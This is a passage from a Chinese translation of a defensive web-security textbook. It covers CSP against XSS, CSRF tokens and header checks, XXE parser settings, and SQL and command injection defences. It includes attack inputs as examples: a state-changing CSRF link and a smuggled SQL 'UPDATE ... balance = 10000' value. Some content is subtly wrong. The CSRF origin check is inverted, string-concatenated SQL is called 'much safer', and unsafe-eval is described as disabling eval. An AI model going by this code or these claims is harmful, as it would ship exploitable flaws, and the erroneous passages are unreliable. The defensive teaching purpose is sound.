CSS 比 JavaScript 更难净化，因此防止此类攻击的最佳方法是不允许上传样式表。或者，您可以专门自行生成样式表，仅允许用户修改您允许的、不会发起 GET 请求的字段。

总之，可以通过以下方式避免 CSS 攻击：

**\[简单\]**
> 不允许用户上传 CSS

**\[中等\]**
> 仅允许用户修改特定字段，并在服务器上使用这些字段自行生成定制的样式表

**\[困难\]**
> 净化任何发起 HTTP 请求的 CSS 属性 (`background:url`)

### 用于防御 XSS 的内容安全策略

内容安全策略（Content Security Policy，CSP）是所有主流浏览器都支持的安全配置工具。它提供的设置可供开发人员用来放宽或收紧有关应用内可以运行何种类型代码的安全规则。

CSP 保护有多种形式，包括可以加载哪些外部脚本、它们可以从哪里加载以及允许哪些 DOM API 执行脚本。让我们评估一些有助于缓解 XSS 风险的 CSP 配置。

#### 脚本源

XSS 带来的重大风险是执行不属于您自己的脚本。可以安全地假设，您为应用编写的脚本是怀着对用户最美好的初衷编写的；因此，您的脚本应该被认为不太可能是恶意的。

另一方面，任何时候只要您的应用执行了不是由您编写而是由另一个用户编写的脚本，您就不能假设该脚本是带着相同的初衷编写的。缓解非您编写的脚本在应用内执行的风险的方法之一，是减少允许的脚本源的数量。

设想 MegaBank 正在开发其支持门户：`support.mega-bank.com`。MegaBank 的支持门户可能会消费来自整个 MegaBank 组织的脚本。您可以调用希望从中消费脚本的特定 URL，例如 `mega-bank.com` 和 `api.mega-bank.com`。

CSP 允许您专门将可以从中加载动态脚本的 URL 加入白名单。这在您的 CSP 中被称为 `script-src`。一个简单的 `script-src` 如下所示：

```http
Content-Security-Policy: script-src "self" https://api.mega-bank.com
```

通过这样的 CSP 配置，尝试从 `https://api2.mega-bank.com` 加载脚本将不会成功，并且浏览器将抛出 CSP 违规错误。这非常有利，因为这意味着来自未知源（如 `https://www.hacker.com`）的脚本将无法在您的网站上加载和执行。

浏览器也会进行 CSP 强制执行，因此它相当难以被绕过。浏览器测试套件非常全面。CSP 也支持通配符主机匹配，但请注意，任何类型的通配符白名单都带有固有的风险。

您可能会认为将 `https://*.mega-bank.com` 加入白名单是明智的，因为您知道此时任何 MegaBank 域名上都没有运行恶意脚本。然而，在未来，如果您选择将 MegaBank 域名重新用于允许用户上传脚本的项目，那么如此广泛的范围可能会对您的应用安全有害。例如，设想一个允许用户上传其自身文档的 `https://hosting.mega-bank.com`。

CSP 声明中的 `"self"` 仅仅是指加载策略的当前 URL 以及正在为其提供服务的受保护文档。因此，CSP 脚本源实际上用于定义多个 URL：用于加载脚本的安全 URL 以及当前 URL。

#### Unsafe Eval 与 Unsafe Inline 

CSP `script-src` 用于确定哪些 URL 可以将动态内容加载到您的页面中。但这并不能防范从您自己的可信服务器加载的脚本。如果攻击者成功将脚本存储在您自己的服务器中（或通过其他方式反射），他们仍然可以在您的应用中将该脚本作为 XSS 攻击执行。

CSP 不能完全防御此类 XSS，但它确实提供了缓解控制措施。这些控制措施允许您在用户的浏览器中全局调节常见的 XSS 接收点。

默认情况下，启用 CSP 时，内联脚本执行是被禁用的。这可以通过在您的 `script-src` 定义中添加 `unsafe-inline` 来重新启用。

类似地，默认情况下，启用 CSP 时，`eval()` 和提供“字符串 $\rightarrow$ 代码”解释的类似方法是被禁用的。这可以通过在您的 `script-src` 定义内部使用 `unsafe-eval` 标志来禁用。

如果您依赖 `eval` 或类似 `eval` 的函数，尝试以一种不会导致其被解释为字符串的方式重写该函数通常是明智的。例如：

```javascript
const startCountDownTimer = function(minutes, message) {
 setTimeout(`window.alert(${message});`, minutes * 60 * 1000);
};
```

写成如下形式更安全：

```javascript
const startCountDownTimer = function(minutes, message) {
setTimeout(function() {
 alert(message);
}, minutes * 60 * 1000);
};
```

虽然两者都是 `setTimeout()` 的有效使用，但随着功能复杂度的增加和新功能的添加，前者更容易受到 XSS 脚本执行的影响。

任何被解释为字符串的函数都存在潜在的逃逸风险，从而导致代码执行。具有高度特定参数的更具体函数可以降低非预期脚本执行的风险。

#### 实现 CSP

CSP 很容易实现，因为它仅仅是一个由浏览器读取并转化为安全规则的字符串配置修改器。主流浏览器支持多种实现您的 CSP 的方法，但最常见的是：

* 让您的服务器在处理每个请求时发送一个 `Content-Security-Policy` 响应头。响应头中的数据应该是安全策略本身。
* 在您的 HTML 标记中嵌入一个 `<meta>` 标签。该 `meta` 标签应该类似于：

```html
<meta http-equiv="Content-Security-Policy" content="script-src
 https://www.mega-bank.com;">
```

如果您已经知道您的应用将依赖何种类型的编程结构和 API，将实施 CSP 作为 XSS 缓解的第一步是明智的。这意味着，如果您知道您将在哪里消费代码以及您将如何消费它，请确保写出正确的 CSP 字符串，并在您开始开发时立即使用它们。CSP 可以在日后很容易地被更改。

### 总结

最常见形式的 XSS 很容易防范。保护您的网站免受 XSS 侵害的困难，通常发生在您具有将用户提交的信息作为 DOM 而不是文本进行显示的业务需求时。

可以在应用栈的多个位置缓解 XSS，从网络层到数据库层，再到客户端。话虽如此，客户端几乎总是理想的缓解点，因为 XSS 需要客户端执行才能算作是一次 XSS 攻击。

应该始终使用防御 XSS 的编码最佳实践。应用在需要时应该使用一个集中的函数来追加到 DOM 中，以便使净化贯穿于整个应用成为常规。应该考虑 DOM 型 XSS 的常见接收点，并且在不需要时，对其进行净化或阻断。

最后，CSP 策略是防御常见 XSS 的极佳第一步措施，但它无法保护您免受 DOM 型 XSS 的侵害。为了认为您的应用妥善防御了 XSS 风险，应该实现上述所有或许多步骤。

---

## 第 29 章防御 CSRF 攻击 
在第二部分中，我们构建了利用用户已认证会话来代表他们发起请求的跨站请求伪造（Cross-Site Request Forgery，CSRF）攻击。我们使用 `<a></a>` 链接、通过 `<img></img>` 标签、甚至使用 Web 表单通过 HTTP POST 构建了 CSRF 攻击。我们看到了 CSRF 类攻击对应用的有效性和危险性，因为它们运行在提升的特权级别上，且通常对已认证用户是不可感知的。

在本章中，我们将学习如何保护我们的代码库免受此类攻击的侵害，并降低我们的用户因针对其已认证会话的任何类型攻击而面临风险的概率。

### 请求头校验 

还记得我们使用 `<a></a>` 链接构建的 CSRF 攻击吗？在讨论中，这些链接是通过电子邮件或完全独立于目标的另一个网站分发的。

由于许多 CSRF 请求的源（Origin）与您的 Web 应用是分离的，我们可以通过检查请求的源来缓解 CSRF 攻击的风险。在 HTTP 的世界中，当检查请求的源时，我们感兴趣的是两个请求头：`referer`（译者注：应为 referrer，但 HTTP 协议中由于历史拼写错误写作 referer）和 `origin`。这些请求头非常重要，因为在所有主流浏览器中，它们都无法使用 JavaScript 进行程序化修改。因此，妥善实现的浏览器 referrer 或 origin 请求头被伪造的概率很低：

**Origin 请求头 (Origin header)**
> `origin` 请求头仅在 HTTP POST 请求上发送。它是一个简单的请求头，指示请求源自何处。与出现在所有请求（无论 HTTP 还是 HTTPS）上的 `referer` 不同。一个 `origin` 请求头类似于：`Origin: https://www.mega-bank.com:80`。

**Referer 请求头 (Referer header)**
> `referer` 请求头设置在所有请求上，并且还指示请求源自何处。该请求头唯一不存在的时间是当引荐链接设置了属性 `rel=noreferrer` 时。一个 `referer` 请求头类似于：`Referer: https://www.mega-bank.com:80`。

当向您的 Web 服务器发起 POST 请求时——例如，`https://www.mega-bank.com/transfer`，参数为 `amount=1000` 且 `to_user=123`——您可以验证这些请求头的位置是否与您运行 Web 服务器的受信源相同。以下是此类检查的 Node 实现：

```javascript
const transferFunds = require('../operations/transferFunds');
const session = require('../util/session');

const validLocations = [
 'https://www.mega-bank.com',
 'https://api.mega-bank.com',
 'https://portal.mega-bank.com'
];

const validateHeadersAgainstCSRF = function(headers) {
 const origin = headers.origin;
 const referer = headers.referer;

 if (!origin || referer) { return false; }
 if (!validLocations.includes(origin) ||
  !validLocations.includes(referer)) {
  return false;
 }
 return true;
};

const transfer = function(req, res) {
 if (!session.isAuthenticated) { return res.sendStatus(401); }
 if (!validateHeadersAgainstCSRF(req.headers)) { return res.sendStatus(401); }
 return transferFunds(session.currentUser, req.query.to_user, req.query.amount);
};

module.exports = transfer;
```

在可能的情况下，对两个请求头都进行检查。如果两个请求头都不存在，可以安全地假设该请求是非标准的，应该予以拒绝。

这些请求头是第一道防线，但存在一种它们会失效的情况。如果攻击者在您的某个白名单源上获取了 XSS，他们就可以从您自己的源发起攻击，从而在您的服务器上显得像是一次合法的请求。

如果您的网站允许发布用户生成的内容，这种情况会更加令人担忧。在这种情况下，校验请求头以确保它们来自您自己的 Web 服务器可能根本没有任何益处。因此，最好采用多种形式的 CSRF 防御，将请求头校验作为一个起点，而不是一个完整的解决方案。

### CSRF 令牌 

防御 CSRF 攻击最强大的防守形式是防 CSRF 令牌（Anti-CSRF Token），通常简称为 CSRF 令牌（见图 29-1）。CSRF 令牌以非常简单的方式防御 CSRF 攻击，并且可以以多种方式实现，以轻松契合您当前的应用架构。大多数主流网站依靠 CSRF 令牌作为其防御 CSRF 攻击的主要手段。

在其核心，CSRF 令牌防御的工作原理如下：

1. 您的 Web 服务器向客户端发送一个特殊的令牌。该令牌是使用具有极低冲突率的算法通过加密方式生成的，这意味着获取两个相同令牌的概率极其罕见。该令牌可以像每次请求那样频繁地重新生成，但通常是每个会话（Session）生成一次。
2. 您的 Web 应用发出的每个请求现在都会带回该令牌；这应该在表单以及 AJAX 请求中发回。当请求到达服务器时，会对令牌进行校验，以确保其处于活跃状态（未过期）、真实且未被篡改。如果校验失败，请求将被记录日志并且同样会执行失败。
3. 由于请求需要一个有效的 CSRF 令牌（该令牌每个会话唯一且对每个用户唯一），源自其他源的 CSRF 攻击变得极其难以实施。攻击者不仅需要一个活跃且最新的 CSRF 令牌，而且他们现在还需要针对特定的用户，而不是针对大量的用户。此外，在令牌过期失效的情况下，当用户点击恶意链接时，CSRF 令牌可能已经失效——这是 CSRF 令牌作为防御策略的一个有益的副作用。

在过去，特别是在用于 API 的 REST 架构兴起之前，许多服务器会保留连接的客户端的记录。正因为如此，服务器为客户端管理 CSRF 令牌是可行的。

在现代 Web 应用中，无状态性（Statelessness）往往是 API 设计的先决条件。无状态设计带来的好处不可低估。仅仅为了添加 CSRF 令牌而将无状态设计更改为有状态设计是不明智的。CSRF 令牌可以很容易地添加到无状态 API 中，但必须涉及加密。

与无状态认证令牌非常相似，一个无状态的 CSRF 令牌应该由以下部分组成：

* 令牌所属用户的唯一标识符
* 时间戳（可用于过期设置）
* 密钥仅存在于服务器上的加密 Nonce

结合这些元素可以为您带来一个 CSRF 令牌，它不仅实用，而且比有状态的替代方案消耗更少的服务器资源，因为与无状态的替代方案相比，管理会话不具有良好的扩展性。

### 防御 CSRF 的编码最佳实践

有许多方法可以在您的 Web 应用中消除或缓解 CSRF 风险，这些方法始于编码或设计阶段。几种最有效的方法是：

* 重构为无状态的 GET 请求
* 实现应用范围内的 CSRF 防御
* 引入请求检查中间件

在您的 Web 应用中实现这些简单的防御将极大地降低沦为针对 CSRF 的黑客牺牲品的风险。

#### 无状态的 GET 请求

由于最常见且最易传播的 CSRF 攻击是通过 HTTP GET 请求进行的，因此正确构建我们的 API 调用以缓解此风险至关重要。HTTP GET 请求不应该存储或修改任何服务端的状态。这样做会使未来的 GET 请求或对 GET 请求的修改容易受到潜在的 CSRF 漏洞的影响。

考虑以下 API：

```javascript
// GET
const user = function(req, res) {
 getUserById(req.query.id).then((user) => {
  if (req.query.updates) { user.update(req.updates); }
  return res.json(user);
 });
};

// GET
const getUser = function(req, res) {
 getUserById(req.query.id).then((user) => {
  return res.json(user);
 });
};

// POST
const updateUser = function(req, res) {
 getUserById(req.query.id).then((user) => {
  user.update(req.updates).then((updated) => {
   if (!updated) { return res.sendStatus(400); }
   return res.sendStatus(200);
  });
 });
};
```

第一个 API 将两个操作组合到单个请求中，并带有一个可选的更新。第二个 API 分别将检索和更新用户拆分为一个 GET 和一个 POST 请求。

在任何 HTTP GET 中，都可以利用第一个 API 进行 CSRF（例如，链接或图像：`https://<url>/user?user=123&updates=email:hacker`）。第二个 API 虽然仍然是 HTTP POST，且可能容易受到更高级的 CSRF 攻击，但无法被链接、图像或其他 HTTP GET 类的 CSRF 攻击所利用。

这看起来像是一个简单的架构缺陷（在 HTTP GET 请求中修改状态），老实说，它确实是。但这里的关键点适用于任何和所有可能修改服务端应用状态的 GET 请求——不要这样做。HTTP GET 请求在默认情况下处于风险之中；Web 的性质使它们更容易受到 CSRF 攻击，您应该避免在有状态操作中使用它们。

### 应用范围内的 CSRF 缓解 

本章中用于防御 CSRF 攻击的技术很有用，但前提是它们在应用范围内得到实现。与许多攻击一样，最薄弱的环会打断链条。通过精心的预先思考，您可以构建一个专门架构用于防御此类攻击的应用。让我们考虑如何构建这样的应用。

#### 防 CSRF 中间件 

大多数现代 Web 服务器栈允许创建中间件（Middleware），即在路由执行任何逻辑之前在每个请求上运行的脚本。可以开发此类中间件来在您的所有服务端路由上实现这些技术。让我们看一看实现这一点的中间件：

```javascript
const crypto = require('../util/crypto');
const dateTime = require('../util/dateTime');
const session = require('../util/session');
const logger = require('../util/logger');

const validLocations = [
 'https://www.mega-bank.com',
 'https://api.mega-bank.com',
 'https://portal.mega-bank.com'
 ];

const validateHeaders = function(headers, method) {
 const origin = headers.origin;
 const referer = headers.referer;
 let isValid = false;

 if (method === 'POST') {
  isValid = validLocations.includes(referer) && validLocations.includes(origin);
 } else {
  isValid = validLocations.includes(referer);
 }
 return isValid;
};

const validateCSRFToken = function(token, user) {
 // 从 CSRF 令牌获取数据
 const text_token = crypto.decrypt(token);
 const user_id = text_token.split(':')[0];
 const date = text_token.split(':')[1];
 const nonce = text_token.split(':')[2];

 // 检查数据的有效性
 let validUser = false;
 let validDate = false;
 let validNonce = false;

 if (user_id === user.id) { validUser = true; }
 if (dateTime.lessThan(1, 'week', date)) { validDate = true; }
 if (crypto.validateNonce(user_id, date, nonce)) { validNonce = true; }

 return validUser && validDate && validNonce;
};

const CSRFShield = function(req, res, next) {
 if (!validateHeaders(req.headers, req.method) ||
  !validateCSRFToken(req.csrf, session.currentUser)) {
  logger.log(req);
  return res.sendStatus(401);
 }
 return next();
};
```

此中间件可以在向服务器发起的的所有请求上调用，也可以单独定义为在特定请求上运行。该中间件仅仅验证 origin 和/或 referrer 请求头是否正确，然后它确保 CSRF 令牌是有效的。如果其中任何一个失败，它将在调用任何其他逻辑之前返回错误；否则，它将移动到下一个中间件并允许应用不加改动地继续执行。

因为该中间件依赖于客户端在每次请求上一致地将 CSRF 令牌传递给服务器，所以最好在客户端也复制此类自动化。这可以通过许多技术来完成。例如，您可以使用代理模式来重写 `XMLHTTPRequest` 的默认行为，以始终包含该令牌。或者，您可以使用更简单的方法，即依赖构建一个用于生成请求的库，该库仅仅包装 `XMLHTTPRequest` 并根据 HTTP 动词注入正确的令牌。

## 总结

通过确保 HTTP GET 请求绝不更改任何应用状态，可以缓解绝大部分的 CSRF 攻击。此外，CSRF 缓解应该考虑校验请求头并将 CSRF 令牌添加到您的每个请求中。有了这些缓解措施就绪，您的用户将能够更放心地从其他源进入您的 Web 应用，并且他们面临由怀有恶意的黑客危害其账户权限的风险将会降低。

---

## 第 30 章防御 XXE 攻击 
一般而言，XML 外部实体（XML External Entity，XXE）漏洞确实很容易防御——只需在您的 XML 解析器中禁用外部实体即可（见图 30-1）。如何做到这一点取决于具体的 XML 解析器，但通常只是一行配置：

```java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

XXE 被 OWASP 认为是对基于 Java 的 XML 解析器特别危险的漏洞，因为许多解析器默认启用了 XXE。根据您依赖的语言和解析器，有可能默认情况下 XXE 是被禁用的。您应该始终检查您的 XML 解析器的 API 文档以确保万无一失。不要仅仅期望它在默认情况下是被禁用的

### 评估其他数据格式

根据您的应用用例，重构应用的架构以依赖另一种数据格式（而不是 XML）可能是可行的。此类更改可以简化代码库，同时消除任何 XXE 风险。通常，在查看其他格式时，XML 可以与 JSON 进行互换，使 JSON 成为默认选择。

另一方面，如果您的应用正在解析实际的 XML、SVG 或其他源自 XML 的文件类型，JSON 将不实用。然而，如果您的应用正在发送标准的层次结构 Payload（它们碰巧呈 XML 形状），它会是一个实用的解决方案。

通常来说，JSON 和 XML 可以像它们是直接竞争对手一样进行并排比较，如表 30-1 所示。

*表 30-1. XML 对比 JSON*

| 类别                     | XML            | JSON                        |
| :----------------------- | :------------- | :-------------------------- |
| Payload 大小             | 大             | 紧凑                        |
| 规范复杂度               | 高             | 低                          |
| 易用性                   | 需要复杂的解析 | 简单的解析，兼容 JavaScript |
| 元数据支持               | 是             | 否                          |
| 渲染（通过类 HTML 结构） | 容易           | 困难                        |
| 混合内容                 | 支持           | 不支持                      |
| Schema 校验              | 支持           | 不支持                      |
| 对象映射                 | 无             | JavaScript                  |
| 可读性                   | 低             | 高                          |
| 注释支持                 | 是             | 否                          |
| 安全性                   | 较低           | 较高                        |

这两种格式的比较可以持续相当长的时间，但您应该从表 30-1 中立即掌握以下几点：

* JSON 是比 XML 轻量得多的格式。
* JSON 提供的严谨性较低，但带来了更快、更容易处理的 Payload。
* JSON 映射到 JavaScript 对象，而 XML 更紧密地映射到 DOM 树（因为 DOM 是一种源自 XML 的格式）。

由此我们可以得出结论，对于处理将由 JavaScript 解释的轻量级结构化数据的任何 API，JSON 应该是可接受的替代方案，而在 Payload 最终将被渲染的任何情况下，XML 可能仍然是理想的选择。

因为 XML 具有 Schema 校验，所以它对于需要深度严谨数据结构的应用也可能是有用的。另一方面，JSON 严谨性较低，这使其非常适合处于持续开发中的 API，从而使客户端和服务器之间的契约不需要持续的维护。

来自 XML 的安全风险大多源于其规范的强大，以及它可以结合外部文件和多媒体的事实。因此，它自然不如 JSON 安全，JSON 是一种仅仅在基于字符串的格式中存储键/值对的格式。

如果您的组织不喜欢移动到 JSON，YAML、BSON 或 EDN 都是合适的替代方案，但在致力于使用之前，应该进行类似的分析。

### 高级 XXE 风险 

请注意，XXE 攻击通常始于只读攻击，但可能会演变为更高级形式的攻击。XXE 是一种“入口”类攻击，因为它为攻击者提供了一个侦察平台，允许他们访问 Web 服务器外部世界原本无法访问的数据。

利用这些数据，可以更容易地危害应用的其他部分。结果是，XXE 攻击的最终影响可以是从只读数据访问到远程代码执行（RCE）和完全的服务器劫持。这就是为什么 XXE 攻击如此令人难以置信地危险。

### 总结

我相信 XXE 在本书中值得关注，因为在生产环境 Web 应用中，不当配置的 XML 解析器是如此普遍，此外，外部实体攻击对组织呈现出重大的风险。XXE 攻击通常很容易缓解，然而它们仍然广泛存在。因此，在发布任何利用 XML 或类 XML 数据类型的应用之前，务必加倍检查每个 XML 解析器的配置。

XXE 攻击是严重的，会给组织、应用或品牌造成重大损害。在处理服务端 XML 解析器时，应采取所有预防措施，以防止意外的 XXE 漏洞混入您的代码库。

---

## 第 31 章 防御注入攻击
在第 13 章中，我们讨论了注入类攻击给 Web 应用带来的风险。这些攻击仍然很常见（虽然它们在过去更常见），通常是由于编写任何涉及 CLI 和用户提交数据的自动化的开发人员缺乏不当关注造成的。

注入攻击也覆盖了广泛的攻击面。注入可以用于针对 CLI 或服务器上运行的任何其他隔离的解释器（当它触及操作系统级别时，它将转变为命令注入）。因此，当考虑我们如何防御注入类攻击时，更容易将此类防御措施分为几类。

首先，我们应该评估防御 SQL 注入攻击——最常见和最广为人知的注入形式。在研究了我们可以做些什么来保护免受 SQL 注入侵害之后，我们可以看到这些防御措施中的哪些将适用于其他形式的注入攻击。最后，我们可以评估几种并非特定于注入类攻击的任何特定子集的通用防御注入的方法。

### 缓解 SQL 注入

SQL 注入是最常见形式的注入攻击，同样也是最容易防御的注入攻击之一。由于它如此广泛存在，潜在地影响到几乎每个复杂的 Web 应用（由于 SQL 数据库的普遍存在），因此已经开发了许多针对 SQL 注入的缓解和应对措施。

此外，由于 SQL 注入攻击发生在 SQL 解释器中，因此检测此类漏洞可以非常简单。有了妥善的检测和缓解策略就绪，您的 Web 应用暴露于 SQL 注入攻击的概率将非常低。

#### 检测 SQL 注入

为了让您的代码库做好防御 SQL 注入攻击的准备，首先熟悉 SQL 注入采取的形式以及代码库中极易受攻击的位置。在大多数现代 Web 应用中，SQL 操作会发生在服务端路由级别之外。这意味着我们对客户端上的任何东西都不太感兴趣。例如，我们有一个应用代码仓库文件结构，看起来像这样：

```text
/api
 /routes
 /utils
/analytics
 /routes
/client
 /pages
 /scripts
 /media
```

我们知道我们可以跳过搜索客户端，但我们应该考虑 analytics 路由，因为即使它构建在开源软件（OSS）之上，它也很可能使用某种数据库来存储分析数据。请记住，如果数据在设备和会话之间持久化，它要么存储在服务端内存、磁盘（日志）中，要么存储在数据库中。

在服务器上，我们应该意识到许多应用使用不止一个数据库。这可能意味着应用使用了 SQL server 和 MySQL。因此，在搜索服务器时，我们需要使用通用查询，以便我们可以跨多个 SQL 语言实现找到 SQL 查询。

此外，一些服务端软件使用领域特定语言（Domain-Specific Language，DSL），这可能会潜在地代表我们进行 SQL 调用，虽然这些调用在结构上与原始 SQL 调用不同。

为了妥善分析现有代码库的潜在 SQL 注入风险，我们需要编译前面所有 DSL 和 SQL 类型的列表，并将其存储在一个地方。

如果我们的应用是一个 Node.js 应用，并包含：

* SQL Server —— 通过 NodeMSSQL 适配器 (npm)
* MySQL —— 通过 mysql 适配器 (npm)

那么我们需要考虑在我们的代码库中构建可以从两种 SQL 实现中找到 SQL 查询的结构化搜索。

幸运的是，结合 JavaScript 语言范围，Node.js 附带的模块导入系统使这变得很容易。如果 SQL 库是在每个模块的基础上导入的，那么寻找查询将变得像搜索导入一样容易：

```javascript
const sql = require('mssql')
// 或者
const mysql = require('mysql');
```

另一方面，如果这些库是全局声明的，或者从父类继承的，那么寻找查询的工作就会变得稍微困难一些。

上述两种适用于 Node.js 的 SQL 适配器都使用以调用 `.query(x)` 结束的语法，但一些适配器使用更字面的语法：

```javascript
const sql = require('sql');

const getUserByUsername = function(username) {
 const q = new sql();
 q.select('*');
 q.from('users');
 q.where(`username = ${username}`);
 q.then((res) => {
 return `username is : ${res}`;
 });
};
```

#### 预编译语句

如前所述，SQL 查询在过去广泛存在且极其危险。但它们在大多数情况下也不太难以防护。

大多数 SQL 实现已开始支持的一项进展是预编译语句（Prepared Statements）。当在 SQL 查询中使用用户提供的数据时，预编译语句减少了大量的风险。除此之外，预编译语句非常容易学习，并使调试 SQL 查询变得更加容易。

预编译语句的工作原理是首先编译查询，并使用占位符值作为变量。这些被称为绑定变量（Bind Variables），但通常仅被称为占位符变量。在编译查询后，占位符将被开发人员提供的值所替换。由于这个两步过程，在考虑任何用户提交的数据之前，查询的意图就已经确定了。

在传统的 SQL 查询中，用户提交的数据（变量）和查询本身一起以字符串的形式发送到数据库。这意味着如果用户数据被篡改，它可能会改变查询的意图。

使用预编译语句，因为在将用户提交的数据提交给 SQL 解释器之前，查询意图就已经确定，所以查询本身无法被改变。这意味着无论如何都无法逃逸针对 users 的 `SELECT` 操作并将其修改为 `DELETE` 操作。如果用户逃逸了原始查询并开始一个新查询，在 `SELECT` 操作之后不会发生额外的查询。预编译语句消除了绝大部分 SQL 注入风险，并受到几乎所有主流 SQL 数据库的支持：MySQL、Oracle、PostgreSQL、Microsoft SQL Server 等。

传统 SQL 查询与预编译语句之间唯一的重大折中是性能。与往返数据库一次不同，在编译后以及在查询运行时，向数据库提供预编译语句，随后是要注入的变量。在大多数应用中，这种性能损失将是微乎其微的。

在语法上，预编译语句因数据库和适配器而异。在 MySQL 中，预编译语句非常简单：

```sql
PREPARE q FROM 'SELECT name, barCode from products WHERE price <= ?';
SET @price = 12;
EXECUTE q USING @price;
DEALLOCATE PREPARE q;
```

在此预编译语句中，我们正在查询 MySQL 数据库以寻找价格小于或等于 `?` 的产品（我们希望返回名称和条形码）。首先，我们使用语句 `PREPARE` 将我们的查询存储在名称 `q` 下。此查询将被编译并准备好供使用。接下来，我们将变量 `@price` 设置为 12。如果用户在电子商务网站上进行过滤，这会是一个由用户设置的良好变量。然后，我们执行提供 `@price` 的查询以填充 `?` 占位符/绑定变量。最后，我们对 `q` 使用 `DEALLOCATE` 将其从内存中移除，以便其命名空间可用于其他事物。

在此简单的预编译语句中，`q` 在使用 `@price` 执行之前就已经完成了编译。即使 `@price` 被设置等于 `5; UPDATE users WHERE id = 123 SET balance = 10000`，额外的查询也不会触发，因为它不会被数据库编译。

此查询安全得多的版本将是：

```javascript
'SELECT name, barcode from products WHERE price <= ' + price + ';'
```

显而易见，预编译语句的预编译是缓解 SQL 注入的重要第一步，应该在您的 Web 应用中尽可能多地使用。

#### 数据库特有防御

除了被广泛采用的预编译语句之外，每个主流 SQL 数据库都提供了其自身用于改善安全的函数。Oracle、MySQL、MS SQL Server 和 Salesforce 对象查询语言（SOQL）都提供了用于自动转义字符和被认为在 SQL 查询中使用存在风险的字符集的方法。决定这些净化的方法取决于所使用的特定数据库和引擎。

Oracle (Java) 提供了一个可以使用以下语法调用的编码器：

```java
ESAPI.encoder().encodeForSQL(new OracleCodec(), str);
```

类似地，MySQL 提供了等效的功能。在 MySQL 中，可以使用以下代码来防止使用未妥善转义的字符串：

```sql
SELECT QUOTE('test''case');
```

MySQL 中的 `QUOTE` 函数将转义反斜杠、单引号或 NULL，并返回一个妥善单引号包裹的字符串。MySQL 同样提供了 `mysql_real_escape_string()`，它转义所有前述的反斜杠和单引号，但也转义双引号、`\n` 和 `\r`（换行符）。

利用数据库特有的字符串净化器来转义危险字符集，通过使编写 SQL 字面量（Literal）相对于字符串变得更加困难，降低了 SQL 注入风险。如果运行的查询无法进行参数化（Parameterized），则应该始终使用这些方法——虽然它们不应该被认为是全面的防御，而应该被认为是一种缓解措施。

### 通用注入防御

除了能够防御 SQL 注入之外，您还应该确保您的应用防御了其他不太常见形式的注入。正如我们在第二部分中学到的，注入攻击可以发生在任何类型的命令行实用工具或解释器上。

我们应该寻找非 SQL 注入目标，并在整个应用逻辑中应用默认安全的编码实践，以降低出现意外注入漏洞的风险。

#### 潜在注入目标

在第 163 页的“代码注入”中，我们探索了视频或图像压缩 CLI 可以被用作潜在注入目标的场景。但注入不限于诸如 FFMPEG 的 CLI。它扩展到将文本作为输入并在某种类型的解释器中解释该文本，或者根据某种命令列表评估该文本的任何类型的脚本。

通常，在防范注入时，以下是高风险目标：

* 任务调度器 (Task schedulers)
* 压缩/优化库 (Compression/optimization libraries)
* 远程备份脚本 (Remote backup scripts)
* 数据库 (Databases)
* 日志记录器 (Loggers)
* 对宿主操作系统的任何调用 (Any call to the host OS)
* 任何解释器或编译器 (Any interpreter or compiler)

当首次对您 Web 应用的组件进行潜在注入风险排序时，将它们与前述的高风险目标列表进行对比。那些是您调查的起点。

依赖项也可能是一个风险，因为许多依赖项引入了它们自己的（子）依赖项，这些子依赖项通常可以归入这些类别之一。

#### 最小权威原则 

**最小权威原则（Principle of Least Authority）**（通常被称为最小权限原则，我认为它稍微不够简练）是一项重要的抽象规则，在尝试构建安全 Web 应用时应该始终使用该原则。该原则指出，在任何系统中，系统的每个成员应该仅拥有访问完成其工作所需的信息和资源的权限（见图 31-1）。

在软件世界中，该原则可以应用于：“软件系统中的每个模块应该仅拥有访问该模块正确运行所需的数据和功能的权限。”这在理论上听起来很简单，但在本应应用的大型 Web 应用中很少应用。随着应用规模的扩大，该原则实际上变得更加重要，因为复杂应用中模块之间的交互会带来非预期的副作用。

设想您正在构建一个与您的 Web 应用集成并自动备份用户个人资料照片的 CLI。此 CLI 要么从终端调用（手动备份），要么通过在构建您 Web 应用的编程语言中编写的适配器调用。如果此 CLI 是使用最小权威原则构建的，那么即使 CLI 失陷，应用的其余部分也不会失陷。另一方面，作为 admin 运行的 CLI 可能会在发现并利用恶意注入攻击的情况下暴露整个应用服务器。

最小权威原则对开发人员来说可能看起来像是一个障碍——管理额外的账户、多个密钥等——但妥善实现此原则将限制在发生入侵的情况下您的应用暴露出的风险。

#### 白名单命令

注入的最大风险是 Web 应用中的一项功能，其中客户端（用户）将命令发送到服务器以执行。这是一项糟糕的架构实践，应该不惜一切代价予以避免。

当在任何允许它们造成潜在损害或改变应用状态的情况下（在误用的情况下）需要在服务器上执行用户选择的命令时，需要额外的步骤。与其允许服务器字面上解释用户命令，不如创建一个明确定义的用户可用命令的白名单。这与明确定义的命令可接受语法（顺序、频率、参数）应该结合使用，全部存储在白名单格式中，而不是黑名单格式中。

考虑以下示例：

```html
<div class="options">
<h2>Commands</h2>
<input type="text" id="command-list"/>
<button type="button" onclick="sendCommands()">Send Commands to Server</button>
</div>
```

```javascript
const cli = require('../util/cli');

/*
 * 接受来自客户端的命令，针对 CLI 运行它们。
 */
const postCommands = function(req, res) {
 cli.run(req.body.commands);
};
```

在此案例中，客户端能够对服务器执行 `cli` 库支持的任何命令。这意味着，仅通过提供 CLI 支持的命令，用户就可以访问 CLI 执行环境和完整范围，即使它们并不是开发人员预留给用户使用的。

在更隐蔽的情况下，也许命令全部由开发人员允许，但语法、顺序和频率可以结合起来在服务器上的 CLI 上创建非预期的功能（注入）。一个快捷且不完美的缓解措施是仅将少数命令加入白名单：

```javascript
const cli = require('../util/cli');

const commands = [
 'print',
 'cut',
 'copy',
 'paste',
 'refresh'
];

/*
 * 仅当客户端命令出现在白名单数组中时，才接受来自客户端的命令并针对 CLI 运行它们。
 */
const postCommands = function(req, res) {
 const userCommands = req.body.commands;
 userCommands.forEach((c) => {
 if (!commands.includes(c)) { return res.sendStatus(400); }
 });
 cli.run(req.body.commands);
};
```

这种快捷且不完美的缓解措施可能无法解决涉及命令顺序或频率的问题，但它将防止调用并非由客户端或终端用户预留使用的命令。不使用黑名单是因为应用会随时间而发展。如果在添加新命令的情况下向用户提供了非预期的功能级别，黑名单会被视为安全风险。当必须接受用户输入并将其喂入 CLI 时，请始终选择白名单方法，而不是黑名单方法。

### 总结

